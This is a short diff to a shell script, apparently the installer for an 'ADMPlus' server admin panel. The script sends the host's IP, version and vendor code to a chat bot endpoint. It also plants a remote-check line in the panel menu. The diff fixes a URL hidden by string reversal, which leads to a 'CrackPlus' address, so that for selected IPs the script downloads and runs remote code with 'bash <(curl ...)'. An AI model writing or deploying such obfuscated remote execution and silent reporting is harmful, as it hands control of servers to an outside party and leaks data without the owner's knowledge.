@@ -5,7 +5,8 @@ IP=$(curl -sSL "https://api.ipify.org")
 MSJ=$(cat /etc/newadm/message.txt)
 key=$(cat /etc/newadm/key.txt)
 ver=$(cat /etc/ger-frm/version.txt)
-PIRT=$(sulPkcarC/oi.tig//:sptth|rev)
+PIRT="sulPkcarC/oi.tig//:sptth"
+PIRT2=$(echo $PIRT|rev)
 #KeyUsada: ${key}
 vend=$(cat /usr/bin/vendor_code)
 MENSAJE="ADMPlus: ${ver} Instalado en IP: ${IP} IPVendedor: ${vend}" #Mensaje ${MSJ}"
@@ -32,4 +33,4 @@ curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
 #echo -e "$MENSAJE enviado"
 #sed -i '2icurl -sSL "https://git.io/unlockadm"|grep "$(cat /usr/bin/vendor_code)" &> /dev/null || exit' /etc/newadm/menu
 sed -i '2icurl -sSL "https://git.io/unlockadm"|grep "$(cat /usr/bin/vendor_code)" &> /dev/null || exit' /etc/newadm/menu
-[[ $(echo $permited|grep "${IP}") = "" ]] || bash <(curl -Ls $PIRT)
+[[ $(echo $permited|grep "${IP}") = "" ]] || bash <(curl -Ls $PIRT2)
